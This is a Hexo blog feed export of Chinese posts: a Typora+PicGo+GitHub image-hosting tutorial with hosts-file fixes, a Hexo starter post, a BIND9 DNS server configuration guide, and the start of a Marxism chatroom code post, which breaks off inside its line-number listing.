    <content type="html"><![CDATA[<h1 id="typora-picgo-github-图床搭建及常见问题解决方式"><a href="#typora-picgo-github-图床搭建及常见问题解决方式" class="headerlink" title="typora+picgo+github 图床搭建及常见问题解决方式"></a>typora+picgo+github 图床搭建及常见问题解决方式</h1><h3 id="1-创建GitHub账号"><a href="#1-创建GitHub账号" class="headerlink" title="1.创建GitHub账号"></a>1.创建GitHub账号</h3><p>GitHub网址：</p><p><a href="https://github.com/">https://github.com/</a></p><h3 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2.创建仓库"></a>2.创建仓库</h3><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305058.png" alt="image-20220728211105729"></p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305502.png" alt="1"></p><h3 id="3-获取token"><a href="#3-获取token" class="headerlink" title="3.获取token"></a>3.获取token</h3><p>进入设置</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305361.png" alt="image-20220728212909371"></p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305489.png" alt="image-20220728213038961"></p><p>进入developer setting</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282132093.png" alt="image-20220728213234042"></p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305877.png" alt="image-20220728213441113"></p><p><strong>注意repo一定要选择</strong></p><p>获取token，记得复制，只显示一次</p><h3 id="4-下载安装picgo"><a href="#4-下载安装picgo" class="headerlink" title="4.下载安装picgo"></a>4.下载安装picgo</h3><p>下载地址：<a href="https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0">https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0</a></p><p>Windows选择如下图的文件</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282145482.png" alt="image-20220728214547417"></p><p>下载后安装</p><h3 id="5-配置github图床"><a href="#5-配置github图床" class="headerlink" title="5.配置github图床"></a>5.配置github图床</h3><p>（注意安装好后点击桌面Picgo图标没有应用界面，需要再点击右下角的工具栏里的相应图标）</p><p>按照如图所示进行配置</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305126.png" alt="image-20220728221212212"></p><p>在picgo设置中开启时间戳重命名，防止出现上传同名文件的422报错</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305077.png" alt="image-20220728221704846"></p><h3 id="6-配置typora"><a href="#6-配置typora" class="headerlink" title="6.配置typora"></a>6.配置typora</h3><p>打开typora —》选择文件—》选择偏好设置—》选择图像</p><p>按照下列设置，最后验证图片上传选项</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282228799.png" alt="image-20220728222830736"></p><p>最后显示如下图则成功</p><p><img src="https://cdn.jsdelivr.net/gh/c1ongyan/picture@main/img/202207282305964.png" alt="image-20220728223600499"></p><h3 id="7-常见问题"><a href="#7-常见问题" class="headerlink" title="7.常见问题"></a>7.常见问题</h3><h4 id="1-最后验证图片无法上传成功：upload-error"><a href="#1-最后验证图片无法上传成功：upload-error" class="headerlink" title="1.最后验证图片无法上传成功：upload error"></a>1.最后验证图片无法上传成功：upload error</h4><p>查看日志：404 可能是配置picgo的时候用户名，仓库名等其他配置写错，仔细检查一遍</p><p>查看日志：422 是上传同名文件的报错，在picgo设置中开启时间戳重命名设置可避免</p><h4 id="2-验证成功上传但是在typora无法查看图片"><a href="#2-验证成功上传但是在typora无法查看图片" class="headerlink" title="2.验证成功上传但是在typora无法查看图片"></a>2.验证成功上传但是在typora无法查看图片</h4><h5 id="2-1修改hosts文件："><a href="#2-1修改hosts文件：" class="headerlink" title="2.1修改hosts文件："></a>2.1修改hosts文件：</h5><p>利用记事本打开：C:\Windows\System32\drivers\etc\hosts （以管理员身份打开记事本，在记事本中打开文件，记得选择全部文件，不然没有显示）</p><p>添加如下的内容到hosts中</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"># GitHub Start <br><span class="hljs-number">140.82.113.3</span>      github.com<br><span class="hljs-number">140.82.114.20</span>     gist.github.com<br><span class="hljs-number">151.101.184.133</span>    assets-cdn.github.com<br><span class="hljs-number">151.101.184.133</span>    raw.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    gist.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    cloud.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    camo.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars0.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars0.githubusercontent.com<br><span class="hljs-number">199.232.28.133</span>     avatars1.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars1.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars2.githubusercontent.com<br><span class="hljs-number">199.232.28.133</span>     avatars2.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars3.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars3.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars4.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars4.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars5.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars5.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars6.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars6.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars7.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars7.githubusercontent.com<br><span class="hljs-number">151.101.184.133</span>    avatars8.githubusercontent.com<br><span class="hljs-number">199.232.68.133</span>     avatars8.githubusercontent.com<br><span class="hljs-number">185.199.111.133</span>    raw.githubusercontent.com <br><span class="hljs-number">185.199.110.133</span>    raw.githubusercontent.com <br><span class="hljs-number">185.199.108.133</span>    raw.githubusercontent.com <br><span class="hljs-number">185.199.109.133</span>    raw.githubusercontent.com <br># GitHub End<br></code></pre></td></tr></table></figure><h5 id="2-2检查配置是否写错"><a href="#2-2检查配置是否写错" class="headerlink" title="2.2检查配置是否写错"></a>2.2检查配置是否写错</h5><p>我在遇到这些问题的时候很多时候都是配置写错了的问题</p><h5 id="2-3重启"><a href="#2-3重启" class="headerlink" title="2.3重启"></a>2.3重启</h5><p>最后解决不了就重启一遍软件，还是在picgo相册中不显示（前面的不会显示，每次都再重新验证一遍），就重装picgo(我只重启过，看别的博主说可以通过重装解决)</p>]]></content>
    
    
    <categories>
      
      <category>blog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PicGo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的第一篇文章</title>
    <link href="/post/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0.html"/>
    <url>/post/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0.html</url>
    
    <content type="html"><![CDATA[<hr><div class="table-container"><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td><td>9</td></tr><tr><td>10</td><td>11</td><td>12</td></tr></tbody></table></div><blockquote><p>引用</p><p>hh</p></blockquote><p><strong>加粗</strong></p><div class="note note-success">            <p>success 便签</p>          </div><div class="note note-warning">            <p>warning 便签</p>          </div><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>脚注<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/post/hello-world.html"/>
    <url>/post/hello-world.html</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DNS服务器搭建</title>
    <link href="/post/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA.html"/>
    <url>/post/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA.html</url>
    
    <content type="html"><![CDATA[<h3 id="DNS服务安装："><a href="#DNS服务安装：" class="headerlink" title="DNS服务安装："></a>DNS服务安装：</h3><p>DNS是一种协议，dns服务是依托bind软件实现的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs linux">apt-get install bind9<br></code></pre></td></tr></table></figure><p>若无法下载，可尝试：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure><h3 id="配置DNS服务："><a href="#配置DNS服务：" class="headerlink" title="配置DNS服务："></a>配置DNS服务：</h3><h4 id="1-主配置文件name-conf-local"><a href="#1-主配置文件name-conf-local" class="headerlink" title="1.主配置文件name.conf.local"></a>1.主配置文件name.conf.local</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">zone <span class="hljs-string">&quot;test.com&quot;</span>  &#123;  #zone:区域设置；<span class="hljs-keyword">test</span>.com:客户端请求的域名地址 <br>    <span class="hljs-keyword">type</span> master;                         <span class="hljs-comment">//正向解析：通过域名查找ip</span><br>    <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;/etc/bind/www.test.com&quot;</span>; <br>&#125;;<br><br>zone <span class="hljs-string">&quot;0.168.192.in-addr.arpa&quot;</span>&#123;<br>    <span class="hljs-keyword">type</span> master;                         <span class="hljs-comment">//反向解析：通过ip查找域名</span><br>    <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;etc/bind/192.168.arpa&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>zone语句基本格式:(zone语句用于定义区域，其中必须说明域名、DNS服务器的类型和区域文件名等信息)</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">zone“域名”&#123;<br><br>     <span class="hljs-keyword">type</span>服务器类型;<br>     file“区域文件名称”;<br>     其他配置子句;&#125;;<br><br><br><span class="hljs-keyword">type</span>子句说明DNS服务器的类型。<br>如果参数为<span class="hljs-literal">master</span>,  表明是主域名服务器;<br>参数为<span class="hljs-literal">slave</span>,表明是辅助域名服务器;<br>参数为hint,表明区域是根区域。<br></code></pre></td></tr></table></figure><p>options语句基本格式：(options 语句定义服务器的全局配置选项)</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">options&#123;<br><br>配置子句<span class="hljs-comment">;&#125;;</span><br><br>其中最常用的配置子句如下。<br><br></code></pre></td></tr></table></figure><p>由于在域名系统中，一个IP地址可以对应多个域名，因此从IP出发去找域名，理论上应该遍历整个域名树，但这在Internet上是不现实的。为了完成逆向域名解析，系统提供一个特别域，该特别域称为逆向解析域in-addr.arpa。这样欲解析的IP地址就会被表达成一种像域名一样的可显示串形式，后缀以逆向解析域域<br>名”in-addr.arpa”结尾。<br>    例如一个IP地址：222.211.233.244，其逆向域名表达方式为：244.233.221.222.in-addr.arpa</p><h4 id="2-正向区域文件"><a href="#2-正向区域文件" class="headerlink" title="2.正向区域文件"></a>2.正向区域文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$TTL</span> <span class="hljs-number">604800</span><br>@        IN   SOA    test.com.   admin.test.com. (<span class="hljs-regexp">//</span>SOA字段<br>                     <span class="hljs-number">20040121</span>         ;Serial        <span class="hljs-regexp">//</span>版本号    同步一次  +<span class="hljs-number">1</span><br>                      <span class="hljs-number">604800</span>          ;Refresh<span class="hljs-regexp">//</span>更新时间<br>                       <span class="hljs-number">86400</span>          ;Retry<span class="hljs-regexp">//</span> 更新失败，重试更新时间<br>                      <span class="hljs-number">2419200</span>         ;Expire<span class="hljs-regexp">//</span> 更新失败多长时间后此DNS失效时间<br>                      <span class="hljs-number">604800</span> )         ;Negative Cache TTL<span class="hljs-regexp">//</span>解析不到请求不予回复时间<br><br>@        IN    NS   www.test.com.         <br>@        IN    A    <span class="hljs-number">192.168</span>.<span class="hljs-number">0.112</span>      <br>@        IN    MX  <span class="hljs-number">10</span> mail.test.com.      <span class="hljs-regexp">//</span> 定义邮件服务器，<span class="hljs-number">10</span>指优先级  <span class="hljs-number">0</span>-<span class="hljs-number">99</span> 数字越小优先级越高<br>www      IN    A    <span class="hljs-number">192.168</span>.<span class="hljs-number">0.112</span>   <span class="hljs-regexp">//</span>www.test.com的ip地址<br>mail     IN    A    <span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>   <span class="hljs-regexp">//</span>邮件服务器的ip地址<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-meta">$TTL</span> <span class="hljs-number">1</span>D<br>域名       <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SOA</span>  主机名 管理员 电子邮件地址 (<br>                                        <span class="hljs-number">0</span>       <span class="hljs-comment">; serial  序列号</span><br>                                        <span class="hljs-number">1</span>D      <span class="hljs-comment">; refresh  刷新时间</span><br>                                        <span class="hljs-number">1</span>H      <span class="hljs-comment">; retry  重试时间</span><br>                                        <span class="hljs-number">1</span>W      <span class="hljs-comment">; expire  过期时间</span><br>                                        <span class="hljs-number">3</span>H )    <span class="hljs-comment">; minimum  最小时间</span><br>        <span class="hljs-keyword">IN</span><span class="hljs-keyword">NS</span>域名服务器<br>区域名<span class="hljs-keyword">IN</span><span class="hljs-keyword">NS</span>域名服务器<br>主机名<span class="hljs-keyword">IN</span><span class="hljs-keyword">A</span>IP 地址<br>别名<span class="hljs-keyword">IN</span><span class="hljs-keyword">CNAME</span>主机名<br>区域名<span class="hljs-keyword">IN</span><span class="hljs-keyword">MX</span>优先级邮件服务器<br><br></code></pre></td></tr></table></figure><h4 id="3-反向区域文件"><a href="#3-反向区域文件" class="headerlink" title="3.反向区域文件"></a>3.反向区域文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$TTL</span> <span class="hljs-number">604800</span><br>@         IN   SOA    test.com.   admin.test.com. (<br>                     <span class="hljs-number">20040121</span>         ;Serial        <span class="hljs-regexp">//</span>版本号    同步一次  +<span class="hljs-number">1</span><br>                      <span class="hljs-number">604800</span>          ;Refresh<span class="hljs-regexp">//</span>更新时间<br>                       <span class="hljs-number">86400</span>          ;Retry<span class="hljs-regexp">//</span> 更新失败，重试更新时间<br>                      <span class="hljs-number">2419200</span>         ;Expire<span class="hljs-regexp">//</span> 更新失败多长时间后此DNS失效时间<br>                      <span class="hljs-number">604800</span> )         ;Negative Cache TTL<span class="hljs-regexp">//</span>解析不到请求不予回复时间<br><br>          IN   NS      www.test.com.<br><span class="hljs-number">112</span>       IN   PTR     www.test.com.     <span class="hljs-regexp">//</span>反向解析PTR格式<br><span class="hljs-number">100</span>       IN   PTR     mail.test.com.<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">$TTL <span class="hljs-number">1D</span><br>域名       <span class="hljs-keyword">IN</span> SOA  主机名 管理员 电子邮件地址 (<br>                                        <span class="hljs-number">0</span>       <span class="hljs-comment">; serial  序列号</span><br>                                        <span class="hljs-number">1D</span>      <span class="hljs-comment">; refresh  刷新时间</span><br>                                        <span class="hljs-number">1H</span>      <span class="hljs-comment">; retry  重试时间</span><br>                                        1W      <span class="hljs-comment">; expire  过期时间</span><br>                                        <span class="hljs-number">3H</span> )    <span class="hljs-comment">; minimum  最小时间</span><br>        <span class="hljs-keyword">IN</span>NS域名服务器<br><span class="hljs-built_in">IP</span><span class="hljs-keyword">IN</span> <span class="hljs-built_in">PTR</span>主机名（域名）<br><br></code></pre></td></tr></table></figure><h5 id="7、DNS资源记录："><a href="#7、DNS资源记录：" class="headerlink" title="7、DNS资源记录："></a>7、DNS资源记录：</h5><ol><li><p><strong>SOA 资源记录(全区唯一)</strong></p><p>每个区在区的开始处都包含了一个起始授权记录（Start of Authority Record）,简称SOA 记录.</p><p>SOA 定义了域的全局参数,进行整个域的管理设置.一个区域文件只允许存在唯一的SOA 记录.</p></li><li><p><strong>NS 资源记录:</strong></p><p>NS（Name Server）记录是域名服务器记录,用来指定该域名由哪个DNS服务器来进行解析.每个区在区根处至少包含一个NS 记录.</p></li><li><p><strong>A 资源记录</strong></p><p>地址（A）资源记录把FQDN 映射到IP 地址. 因为有此记录,所以DNS服务器能解析FQDN域名对应的IP 地址.</p><p>A ：是IPv4地址。 AAAA是IPv6主机地址。</p></li><li><p><strong>PTR 资源记录</strong></p><p>相对于A 资源记录,指针（PTR）记录把IP地址映射到FQDN. 用于反向查询,通过IP地址,找到域名.</p></li><li><p><strong>CNAME 资源记录</strong></p><p>别名记录（CNAME）资源记录创建特定FQDN 的别名.用户可以使用CNAME 记录来隐藏用户网络的实现细节,使连接的客户机无法知道真正的域名.</p><p>例:ping百度时,解析到了百度的别名服务器.百度有个cname=<a href="http://www.a.shifen.com.xn--mcrt9bhy5d/">www.a.shifen.com.的别名</a></p></li><li><p><strong>MX 资源记录</strong></p><p>邮件交换（MX）资源记录,为DNS 域名指定邮件交换服务器.</p><p>邮件交换服务器是为DNS 域名处理或转发邮件的主机.处理邮件指把邮件投递到目的地或转交另一不同类型的邮件传送者.转发邮件指把邮件发送到最终目的服务器,用简单邮件传输协议SMTP 把邮件发送给离最终目的地最近的邮件交换服务器,或使邮件经过一定时间的排队.</p></li></ol><h3 id="启动DNS服务："><a href="#启动DNS服务：" class="headerlink" title="启动DNS服务："></a>启动DNS服务：</h3><p><strong>/etc/resolv.conf</strong>　　转换程序配置文件</p><p>在配置程序请求BIND域名查询服务查询主机名时，必须告诉程序使用哪个域名服务器和IP地址来完成这个任务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>resolv.conf<br></code></pre></td></tr></table></figure><p><img src="C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220323213427942.png" alt="image-20220323213427942"></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">service <span class="hljs-keyword">named</span> start  /service bind9 start<br>service <span class="hljs-keyword">named</span> <span class="hljs-keyword">status</span><br>netstat -anptul |grep <span class="hljs-number">53</span><br>nslookup<br></code></pre></td></tr></table></figure><p>可能出现的问题:</p><p><img src="C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220323005627124.png" alt="image-20220323005627124"></p><p>参考链接:<a href="https://blog.csdn.net/qq_28513801/article/details/102537252">https://blog.csdn.net/qq_28513801/article/details/102537252</a></p><p>​                <a href="https://www.cnblogs.com/lidabo/p/15210887.html">https://www.cnblogs.com/lidabo/p/15210887.html</a></p><p>DNS攻击实例：</p><p>1.</p><p>解决方法：</p><p>1.ERROR: Could not find a version that satisfies the requirement terminaltavles (from versions: none)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pip install 库包名 -i http:<span class="hljs-regexp">//</span>pypi.douban.com<span class="hljs-regexp">/simple/</span> --trusted-host pypi.douban.com<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_45758854/article/details/115578939">https://blog.csdn.net/qq_45758854/article/details/115578939</a></p><p>2.ERROR:  Error installing xettercap-1.5.7xerob.gem:<br>        ERROR: Failed to build gem native extension.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> install libpcap-dev <br>gem install xettercap --<span class="hljs-keyword">pre</span><br><span class="hljs-keyword">python</span> install.<span class="hljs-keyword">py</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>马克思主义聊天室</title>
    <link href="/post/%E9%A9%AC%E5%85%8B%E6%80%9D%E4%B8%BB%E4%B9%89%E8%81%8A%E5%A4%A9%E5%AE%A4.html"/>
    <url>/post/%E9%A9%AC%E5%85%8B%E6%80%9D%E4%B8%BB%E4%B9%89%E8%81%8A%E5%A4%A9%E5%AE%A4.html</url>
    
    <content type="html"><![CDATA[<h2 id="趣味马克思主义聊天室——马原结课趣味设计"><a href="#趣味马克思主义聊天室——马原结课趣味设计" class="headerlink" title="趣味马克思主义聊天室——马原结课趣味设计"></a>趣味马克思主义聊天室——马原结课趣味设计</h2><h3 id="实现功能：趣味对话"><a href="#实现功能：趣味对话" class="headerlink" title="实现功能：趣味对话"></a>实现功能：趣味对话</h3><h3 id="具体代码："><a href="#具体代码：" class="headerlink" title="具体代码："></a>具体代码：</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span 